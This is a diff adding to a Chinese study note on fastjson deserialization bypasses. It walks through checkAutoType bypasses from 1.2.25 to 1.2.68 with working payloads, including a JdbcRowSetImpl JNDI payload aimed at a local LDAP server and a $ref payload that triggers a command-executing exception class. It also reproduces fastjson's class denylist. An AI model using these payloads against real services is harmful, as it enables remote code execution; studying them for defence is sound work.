@@ -472,7 +472,7 @@ public class Test {
 
 这样就能成功打开计算机了，虽然Test类里面没有定义cmd这个变量，但是fastjson依旧会对他进行解析并调用
 
-#### **JdbcRowSetImpl 反序列化**(<=1.2.24)：
+#### *JdbcRowSetImpl 反序列化(<=1.2.24)：*
 
 攻击流程：
 
@@ -490,7 +490,7 @@ payload：
 
 
 
-#### **TemplatesImpl 反序列化(<=1.2.24)[实战意义不大？]：**
+#### TemplatesImpl 反序列化(<=1.2.24)[实战意义不大？]：
 
 流程分析：
 
@@ -695,6 +695,89 @@ payload:
 
 #### ParserConfig (1.2.25 <= fastjson <= 1.2.41):
 
+> 在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。
+>
+> 影响版本：`1.2.25 <= fastjson <= 1.2.41` 描述：作者通过为危险功能添加开关，并提供黑白名单两种方式进行安全防护，其实已经是相当完整的防护思路，而且作者已经意识到黑名单类将会无穷无尽，仅仅通过维护列表来防止反序列化漏洞并非最好的办法。而且靠用户自己来关注安全信息去维护也不现实。
+>
+> [引用原文](https://www.javasec.org/java-vuls/FastJson.html#2-fastjson-1225)
+
+安全更新主要集中在 `com.alibaba.fastjson.parser.ParserConfig`
+
+![image-20241117170444121](assets/image-20241117170444121.png)
+
+可以看到它增加了黑名单和白名单这两个两个列表`denyList`和`aceeptList`
+
+黑名单列表：
+
+```
+bsh
+com.mchange
+com.sun.
+java.lang.Thread
+java.net.Socket
+java.rmi
+javax.xml
+org.apache.bcel
+org.apache.commons.beanutils
+org.apache.commons.collections.Transformer
+org.apache.commons.collections.functors
+org.apache.commons.collections4.comparators
+org.apache.commons.fileupload
+org.apache.myfaces.context.servlet
+org.apache.tomcat
+org.apache.wicket.util
+org.codehaus.groovy.runtime
+org.hibernate
+org.jboss
+org.mozilla.javascript
+org.python.core
+org.springframework
+```
+
+我可以看到我们在1.2.24用到的sun包tomcat包等都被扔到黑名单了
+
+我们可以手动添加白名单
+
+> 添加反序列化白名单有3种方法：
+>
+> 1. 使用代码进行添加：`ParserConfig.getGlobalInstance().addAccept(“org.su18.fastjson.,org.javaweb.”)`
+> 2. 加上JVM启动参数：`-Dfastjson.parser.autoTypeAccept=org.su18.fastjson.`
+> 3. 在fastjson.properties中添加：`fastjson.parser.autoTypeAccept=org.su18.fastjson.`
+
+`autoTypeSupport`是一个开关（布尔值），可以通过`setAutoTypeSupport`方法对其进行赋值
+
+![image-20241117171544432](assets/image-20241117171544432.png)
+
+接着我们看看开启`autoTypeSupport`和不开启有什么区别
+
+![image-20241117171915215](assets/image-20241117171915215.png)
+
+当`autoTypeSupport`开启时，会先判断类名是否在白名单中，如果在，就使用 `TypeUtils.loadClass`进行加载，然后再使用黑名单判断类名的开头，如果匹配就抛出异常。
+
+![image-20241117172536440](assets/image-20241117172536440.png)
+
+当`autoTypeSupport`关闭时，则会先判断类名是否再黑名单中，再判断白名单进行加载
+
+
+
+如果黑白名单都没有匹配，那就只有再开启`autoTypeSupport`且expectClass不为空时才会进行类加载
+
+接着我们进入到loadclass
+
+![image-20241117185032291](assets/image-20241117185032291.png)
+
+> 可以看到这里第一个`if`语句检查`className`字符串是否以`'['`开始，如果是，这意味着`className`表示的是一个数组类型。例如，`"[Ljava/lang/String;"`表示`String`数组。在这种情况下，代码会做以下操作：
+>
+> - 使用`substring(1)`去掉数组标记`'['`，获取数组中元素的类名。
+> - 调用`loadClass`方法加载这个类名对应的`Class`对象。
+> - 使用`Array.newInstance`方法创建一个0长度的数组，并调用`getClass`方法获取这个数组的`Class`对象。
+
+也就是说这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 `[`、`L`、`;` 字符。
+
+既然这样，那我们就可以通过这个漏洞来绕过黑名单的匹配
+
+例如下面的在我们要调用的恶意类名前插入一个字符`L`
+
 payload:
 
 ```java
@@ -707,9 +790,17 @@ payload:
 
 
 
-#### ParserConfig2 (fastjson-1.2.42)
+#### ParserConfig2 (fastjson<=1.2.42)
 
+在1.2.42版本中，fastjson取消了黑白名单的明文显示（防止反向利用黑名单里的类，影响旧版本），而是采用了Hash的方法进行对比
 
+![image-20241117193453860](assets/image-20241117193453860.png)
+
+同时也增加了一个判断，判断前后是否为`L`和`;`(用的Hash比较)
+
+![image-20241117194005282](assets/image-20241117194005282.png)
+
+我进行双写L和;即可绕过
 
 payload:
 
@@ -723,7 +814,23 @@ payload:
 
 
 
-#### JndiDataSourceFactory(1.2.25 <= fastjson <= 1.2.32)
+#### ParserConfig3 (fastjson<=1.2.43)
+
+修复了上个版本双写绕过的方法
+
+但是由于还会对`[`进行递归，所以我们也可以通过`[`来进行绕过
+
+```java
+{
+    "@type":"[com.sun.rowset.JdbcRowSetImpl"[,
+    {"dataSourceName":"ldap://127.0.0.1:23457/Command8",
+    "autoCommit":true
+}
+```
+
+
+
+#### JndiDataSourceFactory(fastjson<=1.2.45)
 
 payload:
 
@@ -740,6 +847,131 @@ payload:
 
 #### 未开启 AutoTypeSupport(1.2.25 <= fastjson <= 1.2.32)：
 
+在 1.2.47 时爆出了可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用的漏洞。
+
+我们知道在`autoTypeSupport`为false的时候会直接进行黑名单的匹配并抛出异常，而且我们无法绕过
+
+也就说我们需要想办法在判断`autoTypeSupport`之前进行类的加载
+
+![image-20241117204006126](assets/image-20241117204006126.png)
+
+我们可以找到，在判断前程序有在 TypeUtils.mappings 中和 deserializers 中尝试查找要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查
+
+![image-20241117204315728](assets/image-20241117204315728.png)
+
+首先我们先查看deserializers的用法，我们可以发现这个值并不可控，也就是这条路走不通
+
+那我们换一条路，我们看看TypeUtils
+
+跟进
+
+![image-20241117204750853](assets/image-20241117204750853.png)
+
+我们可以看到这个方法从mappings取值，这个值是一个ConcurrentHashMap类
+
+![image-20241117205029892](assets/image-20241117205029892.png)
+
+怎样才能给这个类中的参数赋值呢，我们继续看
+
+能给参数赋值的方法有两个，其中这个addBaseClassMappings()虽然能给mappings进行赋值，但是并不能传入参数，行不通
+
+![image-20241117205608988](assets/image-20241117205608988.png)
+
+接下来我们看这个loadClass方法
+
+![image-20241117205921918](assets/image-20241117205921918.png)
+
+详细代码：
+
+```Java
+public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {
+        // 非空判断
+        if(className == null || className.length() == 0){
+            return null;
+        }
+        // 防止重复添加
+        Class<?> clazz = mappings.get(className);
+        if(clazz != null){
+            return clazz;
+        }
+        // 判断 className 是否以 [ 开头
+        if(className.charAt(0) == '['){
+            Class<?> componentType = loadClass(className.substring(1), classLoader);
+            return Array.newInstance(componentType, 0).getClass();
+        }
+        // 判断 className 是否 L 开头 ; 结尾
+        if(className.startsWith("L") && className.endsWith(";")){
+            String newClassName = className.substring(1, className.length() - 1);
+            return loadClass(newClassName, classLoader);
+        }
+        try{
+            // 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中
+            if(classLoader != null){
+                clazz = classLoader.loadClass(className);
+                if (cache) {
+                    mappings.put(className, clazz);
+                }
+                return clazz;
+            }
+        } catch(Throwable e){
+            e.printStackTrace();
+            // skip
+        }
+        // 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中
+        try{
+            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+            if(contextClassLoader != null && contextClassLoader != classLoader){
+                clazz = contextClassLoader.loadClass(className);
+                if (cache) {
+                    mappings.put(className, clazz);
+                }
+                return clazz;
+            }
+        } catch(Throwable e){
+            // skip
+        }
+        // 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中
+        try{
+            clazz = Class.forName(className);
+            mappings.put(className, clazz);
+            return clazz;
+        } catch(Throwable e){
+            // skip
+        }
+        return clazz;
+    }
+```
+
+由此可知，通过这个loadClass方法我们可以给mappings写入任意值
+
+但是在这个TypeUtils类里面loadClass的重载方法有三个
+
+我们应该使用哪一种重载方法呢
+
+在这个调用两个参数的重载方法中
+
+![image-20241117211343970](assets/image-20241117211343970.png)
+
+会返回三个参数的重载方法，并将最后一个参数设置为true
+
+我们看看如何调用它
+
+其中 `com.alibaba.fastjson.serializer.MiscCodece` 的deserialz方法，可以作为入口
+
+![image-20241117213234034](assets/image-20241117213234034.png)
+
+strval的赋值（没太看懂），大概是解析 “val” 中的内容放入 objVal 中，然后传入 strVal 中。
+
+![image-20241117214227131](assets/image-20241117214227131.png)
+
+写个Json调试一下 {\"@type\":\"java.lang.Class\",\"val\":\"aaaaa\"}
+
+可以看到成功给strlVal赋值aaaaa，最后再赋给mappings
+
+![image-20241117215403352](assets/image-20241117215403352.png)
+
+所以可以得到我们最终的payload如下，成功绕开autoTypeSupport的判定
+
 ```java
 {
     "su18": {
@@ -754,7 +986,97 @@ payload:
 }
 ```
 
+#### Throwable（Fastjson<=1.2.68)
 
+影响版本：`fastjson <= 1.2.68` 描述：利用 expectClass 绕过 `checkAutoType()` ，实际上也是为了绕过安全检查的思路的延伸。主要使用 `Throwable` 和 `AutoCloseable` 进行绕过。
+
+> 在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 `MiscCodec` 处理 Class 类的地方，设置了cache 为 false ，并且 `loadClass` 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。
+>
+> 这个安全修复为 fastjson 带来了一定时间的平静，直到 1.2.68 版本出现了新的漏洞利用方式。
+>
+> 版本 1.2.68 本身更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 `checkAutoType()` 中直接抛出异常，也就是完全禁止 autoType，不得不说，这是一个一劳永逸的修复方式。
+>
+> [原文链接](https://www.javasec.org/java-vuls/FastJson.html#8-fastjson-1268)
+
+![image-20241117225824619](assets/image-20241117225824619.png)
+
+这个漏洞主要是因为这个expectClass，当传入的clazz和expectClass不为空且传入的clazz是 expectClass的子类或实现，并且不在黑名单中，就可以通过 checkAutoType() 的安全检测。
+
+那我们看看怎样才能传入这个expectClass参数
+
+其中`ThrowableDeserializer#deserialze()` 方法直接将 `@type` 后的类传入 `checkAutoType()` ，并且 expectClass 为 `Throwable.class`
+
+![image-20241117231809372](assets/image-20241117231809372.png)
+
+> 在fastjson中，在对某个类型反序列化前，先要进行一次ParserConfig#checkAutoType()检查，然后才是获取相应类型的反序列化器进行反序列化。
+>
+> 换言之，到达ThrowableDeserializer#deserialze() 前，就对一个通过@type指定的异常类进行了ParserConfig#checkAutoType()校验。进入到ThrowableDeserializer#deserialze()后，词法分析器会继续遍历JSON字符串剩余的部分，如果紧接着的键还是一个@type的话，就会将它的值，且Throwable.class作为期望类expectClass，一同传入ParserConfig#checkAutoType()进行校验。
+>
+> [原文链接](https://blog.csdn.net/mole_exp/article/details/122315526)
+
+
+
+如果校验通过了，则会实例化这个异常类
+
+![image-20241117233122530](assets/image-20241117233122530.png)
+
+实例化会调用这个类的setter方法
+
+那我们接下来实现一下
+
+首先我们要写一个异常类（为什么是这样写？）
+
+```java
+package org.example;
+
+import java.io.IOException;
+
+public class CalcException extends Exception {
+
+    private String command;
+
+    public void setCommand(String command) {
+        this.command = command;
+    }
+
+    @Override
+    public String getMessage() {
+        try {
+            Runtime.getRuntime().exec(this.command);
+        } catch (IOException e) {
+            return e.getMessage();
+        }
+        return super.getMessage();
+    }
+}
+```
+
+这段 Java 代码定义了一个名为 `CalcException` 的自定义异常类，它继承自 `Exception` 类。这个自定义异常类添加了一个属性 `command`，并且重写了 `getMessage()` 方法，在该方法中尝试执行一个外部命令，并根据执行情况返回相应的错误消息。
+
+接下来我们构建json字符串
+
+> 要注意的是，由于java.lang.Throwable这个类不在缓存集合TypeUtils#mappings中，所以未开启autoType的情况下，这个类是不能通过ParserConfig#checkAutoType()的校验的。这里在JSON字符串中使用它的一个子类java.lang.Exception，因为java.lang.Exception是在缓存集合TypeUtils#mappigns中的。
+>
+> 原文链接：https://blog.csdn.net/mole_exp/article/details/122315526
+
+而且我们上面提到实例化只会调用到setter方法，而我们的异常类调用的是getter方法
+
+可以利用fastjson的JSONPath特性`$ref`去引用指定对象的某个`xxx`属性，从而访问该对象的`getXXX()`方法
+
+payload:
+
+```java
+{"x":
+	{"@type":"java.lang.Exception",
+	 "@type":"me.mole.exception.CalcException", 
+	         "command":"open -a Calculator"}, 
+ "y":{"$ref":"$x.message"}
+ }
+```
+
+![image-20241117234749865](assets/image-20241117234749865.png)
+
+> 上述PoC只是为了验证Throwable这个利用点。实际上很少有异常类会使用到高危函数。
 
 ### payload合集
 
